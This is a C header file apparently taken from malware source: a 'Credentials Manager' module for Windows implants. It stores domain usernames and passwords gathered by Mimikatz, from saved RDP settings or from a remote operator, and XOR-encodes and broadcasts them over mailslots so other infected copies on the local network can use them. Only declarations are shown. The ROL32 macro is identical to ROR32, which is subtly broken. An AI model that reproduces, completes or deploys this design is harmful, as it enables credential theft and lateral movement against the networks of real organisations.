/*
    CredManager.h
    Header file for the Credentials Manager module.
    Provides API to query local or remote credentials (domain, username, password) gathered by other copies on the local network.
    Contains both client and server parts.
*/

#pragma once

#include <Windows.h>
#include "MyStreams.h"

// Enumeration for the origin of credentials
typedef enum ENUM_CRED_ORIGIN {
    CRED_ORIGIN_NOT_SET = 0,    // Not set yet
    CRED_ORIGIN_LOCAL,          // Gathered locally by mimi
    CRED_ORIGIN_NETWORK,        // Received in broadcasted message in local network
    CRED_ORIGIN_SAVED_RDP,      // Got from analyzing locally saved RDP settings (credentials manager or .rdp file)
    CRED_ORIGIN_BUILTIN = 254,  // Supplied by embedded config
    CRED_ORIGIN_SERVER = 255    // Supplied by remote operator
} ENUM_CRED_ORIGIN;

// Single encrypted/encoded buffer
#define ENC_BUFFER_SIZE 208
typedef struct _ENC_BUFFER {
    BYTE bEncBuffer[ENC_BUFFER_SIZE];
    BYTE bEncBufferLen;
} ENC_BUFFER, *PENC_BUFFER;

// Single record of locally stored, encrypted/encoded, and searchable credentials
typedef struct _CREDENTIALS_RECORD {
    UINT64 i64DomainHash;           // Hash to select account from a specific domain
    UINT64 i64SourceMachineHash;    // Hashed name of the machine where this account was gathered
    UINT64 i64DomainUsernameHash;   // Hash to prevent duplicates from adding - domain + username hash
    UINT64 i64PasswordHash;         // Hash to detect new passwords

    ENUM_CRED_ORIGIN coOrigin;      // Origin type of account
    ENUM_CRED_ORIGIN coOrigin2;     // Original origin if this record was ever broadcasted
    BYTE bAccessLevel;              // Access level to prefer more powerful records

    FILETIME ftReceived;            // Timestamp when this account was received (UTC)
    FILETIME ftGathered;            // Timestamp when this account was gathered by the source (UTC)

    ENC_BUFFER ebSourceMachineName; // Name of the machine where this account was originally received
    ENC_BUFFER ebDomain;            // Domain part of the account
    ENC_BUFFER ebUsername;          // Username part of the account
    ENC_BUFFER ebPassword;          // Password part of the account

    DWORD dwLastSentTicks;          // Ticks stamp when this chunk was broadcasted
} CREDENTIALS_RECORD, *PCREDENTIALS_RECORD;

// Structure for adding credentials
typedef struct _ADD_CREDS_RECORD {
    DWORD dwLen;                    // Structure size for validation
    LPWSTR wszDomain;               // Domain part of the account
    LPWSTR wszUsername;             // Username part of the account
    LPWSTR wszPassword;             // Password part of the account
    ENUM_CRED_ORIGIN coOrigin;      // Origin type of account
    ENUM_CRED_ORIGIN coOrigin2;     // Original origin if this record was ever broadcasted
    LPWSTR wszSourceMachineName;    // Name of the machine where this account was originally received
    BYTE bAccessLevel;              // Access level to prefer more powerful records
    FILETIME ftReceived;            // Timestamp when this account was received (UTC)
    FILETIME ftGathered;            // Timestamp when this account was gathered by the source (UTC)
} ADD_CREDS_RECORD, *PADD_CREDS_RECORD;

// Single chunk pointer by linked list
typedef struct _CRED_LIST_CHUNK CRED_LIST_CHUNK;
typedef struct _CRED_LIST_CHUNK {
    CRED_LIST_CHUNK *lcNext;
    CREDENTIALS_RECORD cr;          // Payload in head item is not used
} CRED_LIST_CHUNK, *PCRED_LIST_CHUNK;

// Parameters for the callback function from cmGetCredentialsForDomain()
typedef struct _GCFD_CALLBACK_PARAMS {
    UINT64 i64DomainHash;           // Domain to search records for
    LPWSTR wszUsernameOut;          // Output buffer for username
    LPWSTR wszPasswordOut;          // Output buffer for password
    BYTE bAccessLevel;              // Access level to prefer more powerful records
    BOOL bFound;                    // Set to TRUE if any record was found
    MY_STREAM *msEnumContext;       // Enum context stream to hold all passed domain+username hashes to prevent enum of duplicates
} GCFD_CALLBACK_PARAMS, *PGCFD_CALLBACK_PARAMS;

// Parameters for the callback function from cmAddCredentials()
typedef struct _AC_CALLBACK_PARAMS {
    UINT64 i64DomainUsernameHash;   // First point to check for duplicates
    UINT64 i64PasswordHash;         // To check if we have another password for that record
    ENUM_CRED_ORIGIN ceOrigin;      // To prefer local values of credentials instead of data received from the network
    FILETIME ftGathered;            // To prefer more recent values instead of outdated ones
    BOOL bIsDuplicate;              // Set by the enum function when it detects a duplicate record
} AC_CALLBACK_PARAMS, *PAC_CALLBACK_PARAMS;

// Parameters for the callback function from thrcmCredBroadcaster()
typedef struct _TCB_CALLBACK_PARAMS {
    CRED_LIST_CHUNK *orig_chunk_ptr;    // Pointer to the chunk itself in the chain
    CRED_LIST_CHUNK chunk;              // Local buffer with chunk's data
} TCB_CALLBACK_PARAMS, *PTCB_CALLBACK_PARAMS;

// Parameters for the callback function from _cmChainContainsChunk()
typedef struct _CCC_CALLBACK_PARAMS {
    CRED_LIST_CHUNK *check_ptr;         // Pointer to the chunk to check
    BOOL bFound;                        // Set to TRUE if the chunk is found
} CCC_CALLBACK_PARAMS, *PCCC_CALLBACK_PARAMS;

// Structure of data broadcasted
#pragma pack(push, 1)
typedef struct _SERIALIZED_CREDS_BUFFER {
    DWORD dwRandomKey1;                 // Random key 1 for encoding
    DWORD dwRandomKey2;                 // Random key 2 for encoding
    LARGE_INTEGER liGatheredStamp;      // Timestamp when it was originally gathered
    BYTE bOrigin2;                      // Original source of the credentials
    BYTE bAccessLevel;                  // Access level of the credentials
    BYTE blen_SourceMachineName;        // Length of the source machine name
    BYTE blen_Domain;                   // Length of the domain
    BYTE blen_Username;                 // Length of the username
    BYTE blen_Password;                 // Length of the password
} SERIALIZED_CREDS_BUFFER, *PSERIALIZED_CREDS_BUFFER;
#pragma pack(pop)

// Cycle shifts definitions
#define ROL32(x, r) ((x >> r) | (x << (32 - r)))
#define ROR32(x, r) ((x >> r) | (x << (32 - r)))

// Callback function for enumerating records
typedef BOOL(CALLBACK* CM_ENUM_CALLBACK)(CRED_LIST_CHUNK *, LPVOID);

// Define functions for import-export, used in both compilation modes
typedef struct _CredManager_ptrs {
    FILETIME(*fncmftNow)();
    BOOL(*fncmAddCredentials)(ADD_CREDS_RECORD *acr);
    BOOL(*fncmGetCredentialsForDomain)(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext);
} CredManager_ptrs, *PCredManager_ptrs;

#ifdef ROUTINES_BY_PTR

#pragma message(__FILE__": ROUTINES_BY_PTR compilation mode")

// Global variable definition for transparent code replacements
extern CredManager_ptrs CredManager_apis;

// Transparent code replacements
#define cmftNow CredManager_apis.fncmftNow
#define cmAddCredentials CredManager_apis.fncmAddCredentials
#define cmGetCredentialsForDomain CredManager_apis.fncmGetCredentialsForDomain

// Function to resolve pointers to the API functions
VOID CredManager_resolve(CredManager_ptrs *apis);

#else

#include "DataCallbackManager.h"

// Function declarations
VOID cmStartupNetworkListener();
VOID cmStartupNetworkBroadcaster();
BOOL CALLBACK cmMailslotBroadcastInProcessingDataCallback(DISPATCHER_CALLBACK_PARAMS *dcp);
VOID _cmDoXor(DWORD dwKey1, DWORD dwKey2, LPVOID pBuffer, DWORD lBufferLen);

FILETIME cmftNow();
BOOL cmAddCredentials(ADD_CREDS_RECORD *acr);
BOOL cmGetCredentialsForDomain(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext);

// Function to import pointers to the API functions
VOID CredManager_imports(CredManager_ptrs *apis);

#endif
